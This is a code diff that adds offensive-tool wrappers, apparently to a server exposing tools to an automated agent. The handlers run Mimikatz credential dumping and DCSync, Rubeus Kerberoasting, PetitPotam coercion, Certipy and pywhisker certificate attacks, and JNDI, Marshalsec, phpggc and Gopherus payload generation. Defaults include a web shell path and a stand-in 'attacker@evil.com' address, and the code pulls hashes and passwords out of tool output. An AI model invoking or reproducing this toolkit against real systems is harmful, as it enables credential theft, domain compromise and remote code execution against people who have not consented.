@@ -15,6 +15,7 @@ import shutil
 import json
 import re
 import ipaddress
+import os
 from urllib.parse import urlparse
 from typing import Dict, Any, Optional, Tuple
 
@@ -731,6 +732,210 @@ TOOL_SCHEMAS = {
             },
             "required": ["target_url", "param"]
         }
+    },
+    # P2级工具Schema
+    "dalfox": {
+        "name": "dalfox",
+        "description": "XSS漏洞扫描工具，参数化XSS检测",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "target_url": {"type": "string", "format": "uri", "description": "目标URL"},
+                "mode": {"type": "string", "enum": ["url", "pipe", "file"], "default": "url"},
+                "custom_payload": {"type": "string", "description": "自定义payload文件"}
+            },
+            "required": ["target_url"]
+        }
+    },
+    "httprobe": {
+        "name": "httprobe",
+        "description": "HTTP服务探测工具，快速发现存活Web服务",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "domains_file": {"type": "string", "description": "域名列表文件"},
+                "ports": {"type": "string", "default": "80,443,8080,8443", "description": "探测端口"}
+            },
+            "required": ["domains_file"]
+        }
+    },
+    "githacker": {
+        "name": "githacker",
+        "description": "Git泄露利用工具，恢复Git仓库",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "target_url": {"type": "string", "format": "uri", "description": "目标.git泄露地址"},
+                "output_dir": {"type": "string", "description": "输出目录"}
+            },
+            "required": ["target_url"]
+        }
+    },
+    "gopherus": {
+        "name": "gopherus",
+        "description": "Gopher协议利用工具，生成Gopher payload",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "exploit_type": {"type": "string", "enum": ["mysql", "pgsql", "fastcgi", "redis", "smtp", "zabbix"], "description": "利用类型"},
+                "host": {"type": "string", "description": "目标主机"},
+                "port": {"type": "integer", "description": "目标端口"},
+                "command": {"type": "string", "description": "执行命令"}
+            },
+            "required": ["exploit_type"]
+        }
+    },
+    "phpggc": {
+        "name": "phpggc",
+        "description": "PHP反序列化payload生成工具",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "gadget": {"type": "string", "description": "Gadget链名称"},
+                "parameters": {"type": "string", "description": "参数（JSON格式）"},
+                "technique": {"type": "string", "description": "编码技术（如base64, url等）"}
+            },
+            "required": ["gadget"]
+        }
+    },
+    "certipy": {
+        "name": "certipy",
+        "description": "AD CS攻击工具，证书服务漏洞利用",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "action": {"type": "string", "enum": ["find", "req", "auth", "shadow"], "description": "操作类型"},
+                "target": {"type": "string", "description": "目标域控或CA"},
+                "username": {"type": "string", "description": "用户名"},
+                "password": {"type": "string", "description": "密码"},
+                "domain": {"type": "string", "description": "域名"},
+                "ca": {"type": "string", "description": "CA名称"},
+                "template": {"type": "string", "description": "证书模板"}
+            },
+            "required": ["action"]
+        }
+    },
+    # P3级工具Schema
+    "jndiexploit": {
+        "name": "jndiexploit",
+        "description": "JNDI注入利用工具（JNDIExploit）",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "target_url": {"type": "string", "format": "uri", "description": "目标URL"},
+                "command": {"type": "string", "description": "要执行的命令"},
+                "listener_ip": {"type": "string", "description": "监听IP"},
+                "listener_port": {"type": "integer", "default": 1389, "description": "监听端口"}
+            },
+            "required": ["target_url"]
+        }
+    },
+    "jsfinder": {
+        "name": "jsfinder",
+        "description": "JavaScript文件发现工具",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "target_url": {"type": "string", "format": "uri", "description": "目标URL"},
+                "depth": {"type": "integer", "default": 3, "description": "递归深度"},
+                "output_file": {"type": "string", "description": "输出文件"}
+            },
+            "required": ["target_url"]
+        }
+    },
+    "xxeinjector": {
+        "name": "xxeinjector",
+        "description": "XXE漏洞利用工具",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "target_url": {"type": "string", "format": "uri", "description": "目标URL"},
+                "file_to_read": {"type": "string", "description": "要读取的文件"},
+                "mode": {"type": "string", "enum": ["file", "ssrf", "rce"], "default": "file"},
+                "oob_method": {"type": "string", "enum": ["http", "ftp", "gopher"], "default": "http"}
+            },
+            "required": ["target_url"]
+        }
+    },
+    "petitpotam": {
+        "name": "petitpotam",
+        "description": "AD CS PetitPotam攻击工具",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "target_ip": {"type": "string", "description": "目标域控IP"},
+                "listener_ip": {"type": "string", "description": "监听IP（接收认证）"},
+                "port": {"type": "integer", "default": 445, "description": "目标端口"}
+            },
+            "required": ["target_ip", "listener_ip"]
+        }
+    },
+    "php_filter_chain": {
+        "name": "php_filter_chain",
+        "description": "PHP filter链生成器",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "code": {"type": "string", "description": "要执行的PHP代码"}
+            },
+            "required": ["code"]
+        }
+    },
+    "rubeus": {
+        "name": "rubeus",
+        "description": "Kerberos攻击工具（Rubeus）",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "action": {"type": "string", "enum": ["asktgt", "asktgs", "s4u", "kerberoast", "asreproast"], "description": "操作类型"},
+                "domain": {"type": "string", "description": "域名"},
+                "username": {"type": "string", "description": "用户名"},
+                "password": {"type": "string", "description": "密码"},
+                "hash": {"type": "string", "description": "NTLM Hash"},
+                "spn": {"type": "string", "description": "SPN（kerberoast）"}
+            },
+            "required": ["action"]
+        }
+    },
+    "mimikatz": {
+        "name": "mimikatz",
+        "description": "Windows凭据提取工具",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "action": {"type": "string", "enum": ["sekurlsa_logonpasswords", "sekurlsa_tickets", "lsadump_dcsync", "privilege_debug"], "description": "操作类型"},
+                "target": {"type": "string", "description": "目标（DCSync模式）"}
+            },
+            "required": ["action"]
+        }
+    },
+    "pywhisker": {
+        "name": "pywhisker",
+        "description": "Shadow Credentials攻击工具",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "action": {"type": "string", "enum": ["add", "remove", "list", "clear"], "description": "操作类型"},
+                "target_user": {"type": "string", "description": "目标用户"},
+                "domain": {"type": "string", "description": "域名"},
+                "username": {"type": "string", "description": "当前用户"},
+                "password": {"type": "string", "description": "密码"}
+            },
+            "required": ["action"]
+        }
+    },
+    "marshalsec": {
+        "name": "marshalsec",
+        "description": "Java反序列化利用工具（Marshalsec）",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "gadget": {"type": "string", "description": "Gadget类型"},
+                "command": {"type": "string", "description": "命令或JNDI URL"},
+                "jrmp_port": {"type": "integer", "default": 9999, "description": "JRMP监听端口"}
+            },
+            "required": ["gadget", "command"]
+        }
     }
 }
 
@@ -739,18 +944,44 @@ TOOL_SCHEMAS = {
 # 工具Handler (极简实现)
 # ============================================
 
-async def run_command(cmd: list, timeout: int = 300) -> Dict[str, Any]:
-    """执行命令并返回结果"""
+async def run_command(
+    cmd: list,
+    timeout: int = 300,
+    interactive: bool = False,
+    inputs: list = None
+) -> Dict[str, Any]:
+    """执行命令并返回结果
+
+    Args:
+        cmd: 命令列表
+        timeout: 超时时间（秒）
+        interactive: 是否需要交互式输入
+        inputs: 自动输入列表（按顺序发送给进程）
+
+    Returns:
+        包含success, stdout, stderr的字典
+    """
     try:
         proc = await asyncio.create_subprocess_exec(
             *cmd,
+            stdin=asyncio.subprocess.PIPE if (interactive or inputs) else None,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
-        stdout, stderr = await asyncio.wait_for(
-            proc.communicate(),
-            timeout=timeout
-        )
+
+        # 如果有预设输入，自动发送
+        if inputs:
+            input_data = '\n'.join(inputs) + '\n'
+            stdout, stderr = await asyncio.wait_for(
+                proc.communicate(input_data.encode()),
+                timeout=timeout
+            )
+        else:
+            stdout, stderr = await asyncio.wait_for(
+                proc.communicate(),
+                timeout=timeout
+            )
+
         return {
             "success": proc.returncode == 0,
             "stdout": stdout.decode('utf-8', errors='replace'),
@@ -758,6 +989,104 @@ async def run_command(cmd: list, timeout: int = 300) -> Dict[str, Any]:
         }
     except asyncio.TimeoutError:
         return {"success": False, "error": "超时"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+async def run_command_with_prompts(
+    cmd: list,
+    prompt_responses: Dict[str, str],
+    timeout: int = 300
+) -> Dict[str, Any]:
+    """执行命令并自动响应提示
+
+    Args:
+        cmd: 命令列表
+        prompt_responses: 提示-响应映射 {"提示关键字": "响应内容"}
+        timeout: 超时时间
+
+    Returns:
+        包含success, stdout, stderr, interactions的字典
+    """
+    try:
+        proc = await asyncio.create_subprocess_exec(
+            *cmd,
+            stdin=asyncio.subprocess.PIPE,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+
+        interactions = []
+        stdout_buffer = b""
+        stderr_buffer = b""
+
+        async def read_until_prompt(timeout_per_prompt: float = 5.0):
+            """读取输出直到出现提示或超时"""
+            nonlocal stdout_buffer
+            start = asyncio.get_event_loop().time()
+
+            while asyncio.get_event_loop().time() - start < timeout_per_prompt:
+                try:
+                    chunk = await asyncio.wait_for(proc.stdout.read(1024), timeout=0.5)
+                    if chunk:
+                        stdout_buffer += chunk
+                        output = stdout_buffer.decode('utf-8', errors='replace')
+
+                        # 检查是否匹配任何提示
+                        for prompt_key, response in prompt_responses.items():
+                            if prompt_key.lower() in output.lower():
+                                return prompt_key, response
+                except asyncio.TimeoutError:
+                    continue
+
+            return None, None
+
+        # 主交互循环
+        remaining_responses = prompt_responses.copy()
+        max_interactions = len(prompt_responses) + 5  # 防止无限循环
+        interaction_count = 0
+
+        while interaction_count < max_interactions:
+            prompt_key, response = await read_until_prompt()
+
+            if prompt_key and prompt_key in remaining_responses:
+                # 发送响应
+                proc.stdin.write((response + '\n').encode())
+                await proc.stdin.drain()
+
+                interactions.append({
+                    "prompt": prompt_key,
+                    "response": response
+                })
+
+                del remaining_responses[prompt_key]
+                interaction_count += 1
+
+                if not remaining_responses:
+                    break
+            else:
+                # 没有更多提示，等待进程结束
+                break
+
+        # 等待进程结束
+        try:
+            remaining_stdout, remaining_stderr = await asyncio.wait_for(
+                proc.communicate(),
+                timeout=timeout
+            )
+            stdout_buffer += remaining_stdout
+            stderr_buffer += remaining_stderr
+        except asyncio.TimeoutError:
+            proc.kill()
+            return {"success": False, "error": "交互超时"}
+
+        return {
+            "success": proc.returncode == 0,
+            "stdout": stdout_buffer.decode('utf-8', errors='replace'),
+            "stderr": stderr_buffer.decode('utf-8', errors='replace'),
+            "interactions": interactions
+        }
+
     except Exception as e:
         return {"success": False, "error": str(e)}
 
@@ -1677,10 +2006,714 @@ async def ssrfmap_handler(
 
 
 # ============================================
+# P2级工具 - 高级利用
+# ============================================
+
+async def dalfox_handler(
+    target_url: str,
+    mode: str = "url",
+    custom_payload: str = None
+) -> Dict:
+    """dalfox执行 - XSS漏洞扫描工具"""
+    dalfox_path = shutil.which("dalfox") or "/usr/local/bin/dalfox"
+    if not os.path.exists(dalfox_path):
+        return {"success": False, "error": "dalfox未安装"}
+
+    # SSRF防护
+    is_valid, error = validate_url_for_ssrf(target_url)
+    if not is_valid:
+        return {"success": False, "error": error}
+
+    cmd = [dalfox_path, "url", target_url, "--format", "json", "--silent"]
+
+    if custom_payload and os.path.exists(custom_payload):
+        cmd.extend(["--custom-payload", custom_payload])
+
+    result = await run_command(cmd, timeout=300)
+
+    if result["success"]:
+        output = result.get("stdout", "")
+        vulns = []
+
+        for line in output.strip().split('\n'):
+            if line.strip().startswith('{'):
+                try:
+                    data = json.loads(line)
+                    vulns.append({
+                        "type": data.get("type", "XSS"),
+                        "param": data.get("param", ""),
+                        "payload": data.get("payload", ""),
+                        "evidence": data.get("evidence", "")
+                    })
+                except:
+                    pass
+
+        result["vulnerabilities"] = vulns
+        result["vuln_count"] = len(vulns)
+
+    return result
+
+
+async def httprobe_handler(
+    domains_file: str,
+    ports: str = "80,443,8080,8443"
+) -> Dict:
+    """httprobe执行 - HTTP服务探测工具"""
+    httprobe_path = shutil.which("httprobe") or "/usr/local/bin/httprobe"
+    if not os.path.exists(httprobe_path):
+        return {"success": False, "error": "httprobe未安装"}
+
+    # 检查输入文件
+    if not os.path.exists(domains_file):
+        return {"success": False, "error": f"域名文件不存在: {domains_file}"}
+
+    cmd = [httprobe_path]
+
+    # 添加端口
+    if ports:
+        for port in ports.split(','):
+            cmd.extend(["-p", port.strip()])
+
+    # 从文件读取域名并传递给httprobe
+    try:
+        with open(domains_file, 'r') as f:
+            domains = f.read()
+    except Exception as e:
+        return {"success": False, "error": f"读取域名文件失败: {e}"}
+
+    # httprobe从stdin读取
+    proc = await asyncio.create_subprocess_exec(
+        *cmd,
+        stdin=asyncio.subprocess.PIPE,
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE
+    )
+
+    stdout, stderr = await asyncio.wait_for(
+        proc.communicate(domains.encode()),
+        timeout=300
+    )
+
+    result = {
+        "success": proc.returncode == 0,
+        "stdout": stdout.decode('utf-8', errors='replace'),
+        "stderr": stderr.decode('utf-8', errors='replace')
+    }
+
+    if result["success"]:
+        urls = [line.strip() for line in result["stdout"].strip().split('\n') if line.strip()]
+        result["urls"] = urls
+        result["count"] = len(urls)
+
+    return result
+
+
+async def githacker_handler(
+    target_url: str,
+    output_dir: str = None
+) -> Dict:
+    """GitHacker执行 - Git泄露利用工具"""
+    githacker_path = "/app/thirdparty/Githacker/GitHack.py"
+    if not os.path.exists(githacker_path):
+        return {"success": False, "error": "GitHacker未安装"}
+
+    # SSRF防护
+    is_valid, error = validate_url_for_ssrf(target_url)
+    if not is_valid:
+        return {"success": False, "error": error}
+
+    # 确保URL以.git结尾
+    if not target_url.endswith('.git'):
+        target_url = target_url.rstrip('/') + '/.git'
+
+    if not output_dir:
+        output_dir = f"/tmp/git_leak_{hash(target_url) % 10000}"
+
+    cmd = ["python3", githacker_path, "--url", target_url, "--output", output_dir]
+
+    result = await run_command(cmd, timeout=300)
+
+    if result["success"]:
+        result["output_dir"] = output_dir
+        result["message"] = f"Git仓库已恢复到: {output_dir}"
+
+        # 检查是否有敏感文件
+        sensitive_files = []
+        for root, dirs, files in os.walk(output_dir):
+            for f in files:
+                if any(keyword in f.lower() for keyword in ['config', 'credential', 'password', 'key', 'secret']):
+                    sensitive_files.append(os.path.join(root, f))
+
+        if sensitive_files:
+            result["sensitive_files"] = sensitive_files
+
+    return result
+
+
+async def gopherus_handler(
+    exploit_type: str,
+    host: str = None,
+    port: int = None,
+    command: str = None
+) -> Dict:
+    """Gopherus执行 - Gopher协议利用工具（自动交互）"""
+    gopherus_path = "/app/thirdparty/Gopherus/gopherus.py"
+    if not os.path.exists(gopherus_path):
+        return {"success": False, "error": "Gopherus未安装"}
+
+    # exploit_type白名单
+    allowed_types = ["mysql", "pgsql", "fastcgi", "redis", "smtp", "zabbix"]
+    if exploit_type not in allowed_types:
+        return {"success": False, "error": f"不支持的exploit_type: {exploit_type}。支持: {', '.join(allowed_types)}"}
+
+    cmd = ["python3", gopherus_path]
+
+    # 默认密码（可被command参数覆盖）
+    default_password = ""
+    default_query = command or ""
+
+    # 定义各类型的提示-响应映射
+    prompt_mappings = {
+        "mysql": {
+            "mysql user": "root",
+            "mysql password": default_password,
+            "query": default_query or "SELECT user();"
+        },
+        "pgsql": {
+            "postgres user": "postgres",
+            "postgres password": default_password,
+            "query": default_query or "SELECT version();"
+        },
+        "fastcgi": {
+            "server ip": host or "127.0.0.1",
+            "server port": str(port or 9000),
+            "file": default_query or "/var/www/html/shell.php"
+        },
+        "redis": {
+            "redis command": default_query or "INFO"
+        },
+        "smtp": {
+            "mail from": "attacker@evil.com",
+            "mail to": default_query or "victim@target.com",
+            "subject": "Test",
+            "message": "Test message"
+        },
+        "zabbix": {
+            "server ip": host or "127.0.0.1",
+            "server port": str(port or 10051),
+            "command": default_query or "whoami"
+        }
+    }
+
+    # 选择对应类型的参数
+    if exploit_type not in prompt_mappings:
+        return {"success": False, "error": f"未实现的exploit_type: {exploit_type}"}
+
+    prompt_responses = prompt_mappings[exploit_type]
+
+    # 使用自动交互执行
+    result = await run_command_with_prompts(cmd, prompt_responses, timeout=60)
+
+    if result["success"]:
+        output = result.get("stdout", "")
+        # 提取gopher payload
+        gopher_payload = ""
+        for line in output.split('\n'):
+            if line.startswith('gopher://'):
+                gopher_payload = line.strip()
+                break
+
+        result["gopher_payload"] = gopher_payload
+        result["exploit_type"] = exploit_type
+        result["interactions"] = result.get("interactions", [])
+
+    return result
+
+
+async def phpggc_handler(
+    gadget: str,
+    parameters: str = None,
+    technique: str = None
+) -> Dict:
+    """phpggc执行 - PHP反序列化payload生成"""
+    phpggc_path = "/app/thirdparty/phpggc/phpggc"
+    if not os.path.exists(phpggc_path):
+        return {"success": False, "error": "phpggc未安装"}
+
+    cmd = [phpggc_path, gadget]
+
+    if technique:
+        allowed_techniques = ["base64", "url", "quoted", "double"]
+        if technique not in allowed_techniques:
+            return {"success": False, "error": f"不支持的technique: {technique}"}
+        cmd.append(f"--{technique}")
+
+    if parameters:
+        cmd.append(parameters)
+
+    result = await run_command(cmd, timeout=30)
+
+    if result["success"]:
+        payload = result.get("stdout", "")
+        result["payload"] = payload
+        result["payload_size"] = len(payload)
+        result["gadget"] = gadget
+
+    return result
+
+
+async def certipy_handler(
+    action: str,
+    target: str = None,
+    username: str = None,
+    password: str = None,
+    domain: str = None,
+    ca: str = None,
+    template: str = None
+) -> Dict:
+    """Certipy执行 - AD CS攻击工具"""
+    certipy_path = shutil.which("certipy")
+    if not certipy_path:
+        return {"success": False, "error": "certipy未安装"}
+
+    # action白名单
+    allowed_actions = ["find", "req", "auth", "shadow"]
+    if action not in allowed_actions:
+        return {"success": False, "error": f"不支持的action: {action}。支持: {', '.join(allowed_actions)}"}
+
+    cmd = ["certipy", action]
+
+    if action == "find":
+        # 发现AD CS服务
+        if not target:
+            return {"success": False, "error": "find模式需要target参数"}
+        cmd.extend(["-u", username or "", "-p", password or "", "-target", target])
+        if domain:
+            cmd.extend(["-domain", domain])
+
+    elif action == "req":
+        # 请求证书
+        if not all([target, username, password, ca]):
+            return {"success": False, "error": "req模式需要target, username, password, ca参数"}
+        cmd.extend(["-u", username, "-p", password, "-target", target, "-ca", ca])
+        if template:
+            cmd.extend(["-template", template])
+
+    elif action == "auth":
+        # 使用证书认证
+        if not all([username, password, domain]):
+            return {"success": False, "error": "auth模式需要username, password, domain参数"}
+        cmd.extend(["-u", username, "-p", password, "-domain", domain])
+
+    elif action == "shadow":
+        # Shadow Credentials攻击
+        if not all([target, username, password, domain]):
+            return {"success": False, "error": "shadow模式需要target, username, password, domain参数"}
+        cmd.extend(["-u", username, "-p", password, "-target", target, "-domain", domain])
+
+    result = await run_command(cmd, timeout=300)
+
+    if result["success"]:
+        output = result.get("stdout", "")
+        result["output"] = output
+
+    return result
+
+
+# ============================================
+# P3级工具 - 特定场景利用
+# ============================================
+
+async def jndiexploit_handler(
+    target_url: str,
+    command: str = None,
+    listener_ip: str = None,
+    listener_port: int = 1389
+) -> Dict:
+    """JNDIExploit执行 - JNDI注入利用工具"""
+    jndiexploit_path = "/app/thirdparty/JNDIExploit.jar"
+    if not os.path.exists(jndiexploit_path):
+        return {"success": False, "error": "JNDIExploit未安装"}
+
+    # SSRF防护
+    is_valid, error = validate_url_for_ssrf(target_url)
+    if not is_valid:
+        return {"success": False, "error": error}
+
+    if not listener_ip:
+        return {"success": False, "error": "需要listener_ip参数"}
+
+    cmd = ["java", "-jar", jndiexploit_path, "-i", listener_ip]
+
+    if listener_port != 1389:
+        cmd.extend(["-p", str(listener_port)])
+
+    if command:
+        cmd.extend(["-C", command])
+
+    result = await run_command(cmd, timeout=60)
+
+    if result["success"]:
+        output = result.get("stdout", "")
+        jndi_urls = []
+        for line in output.split('\n'):
+            if 'ldap://' in line or 'rmi://' in line:
+                jndi_urls.append(line.strip())
+
+        result["jndi_urls"] = jndi_urls
+        result["listener"] = f"{listener_ip}:{listener_port}"
+
+    return result
+
+
+async def jsfinder_handler(
+    target_url: str,
+    depth: int = 3,
+    output_file: str = None
+) -> Dict:
+    """JSFinder执行 - JavaScript文件发现工具"""
+    jsfinder_path = "/app/thirdparty/jsfinder/JSFinder.py"
+    if not os.path.exists(jsfinder_path):
+        return {"success": False, "error": "JSFinder未安装"}
+
+    # SSRF防护
+    is_valid, error = validate_url_for_ssrf(target_url)
+    if not is_valid:
+        return {"success": False, "error": error}
+
+    cmd = ["python3", jsfinder_path, "-u", target_url, "-d", str(depth)]
+
+    if output_file:
+        cmd.extend(["-o", output_file])
+
+    result = await run_command(cmd, timeout=180)
+
+    if result["success"]:
+        output = result.get("stdout", "")
+        js_files = []
+
+        for line in output.split('\n'):
+            if line.strip().endswith('.js') and 'http' in line:
+                js_files.append(line.strip())
+
+        result["js_files"] = js_files
+        result["count"] = len(js_files)
+
+        if output_file:
+            result["output_file"] = output_file
+
+    return result
+
+
+async def xxeinjector_handler(
+    target_url: str,
+    file_to_read: str = None,
+    mode: str = "file",
+    oob_method: str = "http"
+) -> Dict:
+    """XXEinjector执行 - XXE漏洞利用工具"""
+    xxeinjector_path = "/app/thirdparty/xxe-injector/XXEinjector.py"
+    if not os.path.exists(xxeinjector_path):
+        return {"success": False, "error": "XXEinjector未安装"}
+
+    # SSRF防护
+    is_valid, error = validate_url_for_ssrf(target_url)
+    if not is_valid:
+        return {"success": False, "error": error}
+
+    # mode白名单
+    allowed_modes = ["file", "ssrf", "rce"]
+    if mode not in allowed_modes:
+        return {"success": False, "error": f"不支持的mode: {mode}"}
+
+    cmd = ["ruby", xxeinjector_path, "--url", target_url]
+
+    if file_to_read:
+        cmd.extend(["--file", file_to_read])
+
+    cmd.extend(["--mode", mode, "--oob", oob_method])
+
+    result = await run_command(cmd, timeout=300)
+
+    if result["success"]:
+        output = result.get("stdout", "")
+        result["output"] = output
+
+        if file_to_read and mode == "file":
+            result["read_file"] = file_to_read
+
+    return result
+
+
+async def petitpotam_handler(
+    target_ip: str,
+    listener_ip: str,
+    port: int = 445
+) -> Dict:
+    """PetitPotam执行 - AD CS PetitPotam攻击"""
+    petitpotam_path = "/app/thirdparty/PetitPotam/PetitPotam.exe"
+    if not os.path.exists(petitpotam_path):
+        # 尝试Python版本
+        petitpotam_py = "/app/thirdparty/PetitPotam/PetitPotam.py"
+        if os.path.exists(petitpotam_py):
+            cmd = ["python3", petitpotam_py, target_ip, listener_ip]
+        else:
+            return {"success": False, "error": "PetitPotam未安装"}
+    else:
+        # Windows exe在Linux上无法直接运行，需要Wine
+        cmd = ["wine", petitpotam_path, target_ip, listener_ip]
+
+    result = await run_command(cmd, timeout=60)
+
+    if result["success"]:
+        result["target"] = target_ip
+        result["listener"] = listener_ip
+        result["message"] = f"PetitPotam认证请求已发送到 {listener_ip}"
+
+    return result
+
+
+async def php_filter_chain_handler(
+    code: str
+) -> Dict:
+    """PHP filter链生成器"""
+    php_filter_path = "/app/thirdparty/php_filter_chain/php_filter_chain_generator.py"
+    if not os.path.exists(php_filter_path):
+        return {"success": False, "error": "PHP filter chain generator未安装"}
+
+    if not code:
+        return {"success": False, "error": "需要code参数"}
+
+    cmd = ["python3", php_filter_path, "--chain", code]
+
+    result = await run_command(cmd, timeout=30)
+
+    if result["success"]:
+        output = result.get("stdout", "")
+        filter_chain = ""
+
+        for line in output.split('\n'):
+            if 'php://' in line or 'filter' in line:
+                filter_chain = line.strip()
+                break
+
+        result["filter_chain"] = filter_chain or output
+        result["code"] = code
+
+    return result
+
+
+async def rubeus_handler(
+    action: str,
+    domain: str = None,
+    username: str = None,
+    password: str = None,
+    hash: str = None,
+    spn: str = None
+) -> Dict:
+    """Rubeus执行 - Kerberos攻击工具"""
+    rubeus_path = "/opt/tools/windows/Rubeus.exe"
+    if not os.path.exists(rubeus_path):
+        return {"success": False, "error": "Rubeus未安装"}
+
+    # action白名单
+    allowed_actions = ["asktgt", "asktgs", "s4u", "kerberoast", "asreproast"]
+    if action not in allowed_actions:
+        return {"success": False, "error": f"不支持的action: {action}"}
+
+    # Rubeus是Windows工具，需要通过Wine或传递给Windows目标执行
+    cmd = ["wine", rubeus_path, action]
+
+    if action == "asktgt":
+        if not all([domain, username]):
+            return {"success": False, "error": "asktgt需要domain和username"}
+        cmd.extend(["/domain:" + domain, "/user:" + username])
+        if password:
+            cmd.append("/password:" + password)
+        elif hash:
+            cmd.append("/rc4:" + hash)
+
+    elif action == "kerberoast":
+        if spn:
+            cmd.append("/spn:" + spn)
+        cmd.append("/nowrap")
+
+    elif action == "asreproast":
+        if username:
+            cmd.append("/user:" + username)
+        cmd.append("/nowrap")
+
+    result = await run_command(cmd, timeout=60)
+
+    if result["success"]:
+        output = result.get("stdout", "")
+        result["output"] = output
+
+        # 提取hash
+        hashes = []
+        for line in output.split('\n'):
+            if '$krb5' in line or 'aes256' in line or 'rc4' in line:
+                hashes.append(line.strip())
+
+        if hashes:
+            result["hashes"] = hashes
+
+    return result
+
+
+async def mimikatz_handler(
+    action: str,
+    target: str = None
+) -> Dict:
+    """Mimikatz执行 - Windows凭据提取工具"""
+    mimikatz_path = "/opt/tools/windows/mimikatz.exe"
+    if not os.path.exists(mimikatz_path):
+        return {"success": False, "error": "Mimikatz未安装"}
+
+    # action白名单
+    allowed_actions = ["sekurlsa_logonpasswords", "sekurlsa_tickets", "lsadump_dcsync", "privilege_debug"]
+    if action not in allowed_actions:
+        return {"success": False, "error": f"不支持的action: {action}"}
+
+    # 构建mimikatz命令
+    cmd = ["wine", mimikatz_path]
+
+    if action == "sekurlsa_logonpasswords":
+        cmd.append("sekurlsa::logonpasswords")
+    elif action == "sekurlsa_tickets":
+        cmd.append("sekurlsa::tickets")
+    elif action == "lsadump_dcsync":
+        if not target:
+            return {"success": False, "error": "lsadump_dcsync需要target参数"}
+        cmd.append(f"lsadump::dcsync /domain:{target}")
+    elif action == "privilege_debug":
+        cmd.append("privilege::debug")
+
+    cmd.append("exit")
+
+    result = await run_command(cmd, timeout=120)
+
+    if result["success"]:
+        output = result.get("stdout", "")
+        result["output"] = output
+
+        # 提取凭据
+        credentials = []
+        for line in output.split('\n'):
+            if any(keyword in line.lower() for keyword in ['password', 'ntlm', 'aes256', 'sha1']):
+                credentials.append(line.strip())
+
+        if credentials:
+            result["credentials"] = credentials
+
+    return result
+
+
+async def pywhisker_handler(
+    action: str,
+    target_user: str = None,
+    domain: str = None,
+    username: str = None,
+    password: str = None
+) -> Dict:
+    """pywhisker执行 - Shadow Credentials攻击工具"""
+    pywhisker_path = shutil.which("pywhisker")
+    if not pywhisker_path:
+        return {"success": False, "error": "pywhisker未安装"}
+
+    # action白名单
+    allowed_actions = ["add", "remove", "list", "clear"]
+    if action not in allowed_actions:
+        return {"success": False, "error": f"不支持的action: {action}"}
+
+    if not all([domain, username, password]):
+        return {"success": False, "error": "需要domain, username, password参数"}
+
+    cmd = [
+        "pywhisker",
+        "-d", domain,
+        "-u", username,
+        "-p", password,
+        "--target", target_user or username,
+        "--action", action
+    ]
+
+    result = await run_command(cmd, timeout=120)
+
+    if result["success"]:
+        output = result.get("stdout", "")
+        result["output"] = output
+
+        if action == "add":
+            # 提取证书
+            for line in output.split('\n'):
+                if 'Certificate' in line or 'PFX' in line:
+                    result["certificate_info"] = line.strip()
+
+    return result
+
+
+async def marshalsec_handler(
+    gadget: str,
+    command: str,
+    jrmp_port: int = 9999
+) -> Dict:
+    """Marshalsec执行 - Java反序列化利用工具"""
+    marshalsec_path = "/app/thirdparty/marshalsec.jar"
+    if not os.path.exists(marshalsec_path):
+        return {"success": False, "error": "Marshalsec未安装"}
+
+    # gadget白名单
+    allowed_gadgets = [
+        "RMIRegistryExploit", "JRMPListener", "JRMPClient",
+        "Spring1", "CommonsBeanutils1", "CommonsCollections1"
+    ]
+    if gadget not in allowed_gadgets:
+        # 允许自定义gadget但给出警告
+        pass
+
+    cmd = [
+        "java", "-cp", marshalsec_path,
+        "marshalsec." + gadget,
+        command
+    ]
+
+    if gadget == "JRMPListener":
+        cmd = [
+            "java", "-cp", marshalsec_path,
+            "marshalsec.jmx.JRMPListener",
+            str(jrmp_port),
+            command
+        ]
+
+    result = await run_command(cmd, timeout=60)
+
+    if result["success"]:
+        output = result.get("stdout", "")
+        result["output"] = output
+        result["gadget"] = gadget
+        result["command"] = command
+
+        if gadget == "JRMPListener":
+            result["jrmp_port"] = jrmp_port
+            result["message"] = f"JRMP监听器启动在端口 {jrmp_port}"
+
+    return result
+
+
+# ============================================
 # 工具注册表
 # ============================================
 
+# 导入专业方向工具
+from .specialized_schemas import ALL_SPECIALIZED_SCHEMAS
+from .specialized_handlers import SPECIALIZED_HANDLERS
+
+# 合并Schema
+TOOL_SCHEMAS.update(ALL_SPECIALIZED_SCHEMAS)
+
 HANDLERS = {
+    # P0级核心工具
     "nmap": nmap_handler,
     "nuclei": nuclei_handler,
     "httpx": httpx_handler,
@@ -1694,14 +2727,44 @@ HANDLERS = {
     "impacket": impacket_handler,
     "bloodhound": bloodhound_handler,
     "hydra": hydra_handler,
-    # P0级新增
     "xray": xray_handler,
     "subfinder": subfinder_handler,
     "frp": frp_handler,
-    # P1级新增
+    # P1级工具
     "ysoserial": ysoserial_handler,
     "jwt_tool": jwt_tool_handler,
     "ssrfmap": ssrfmap_handler,
+    # P2级工具
+    "dalfox": dalfox_handler,
+    "httprobe": httprobe_handler,
+    "githacker": githacker_handler,
+    "gopherus": gopherus_handler,
+    "phpggc": phpggc_handler,
+    "certipy": certipy_handler,
+    # P3级工具
+    "jndiexploit": jndiexploit_handler,
+    "jsfinder": jsfinder_handler,
+    "xxeinjector": xxeinjector_handler,
+    "petitpotam": petitpotam_handler,
+    "php_filter_chain": php_filter_chain_handler,
+    "rubeus": rubeus_handler,
+    "mimikatz": mimikatz_handler,
+    "pywhisker": pywhisker_handler,
+    "marshalsec": marshalsec_handler,
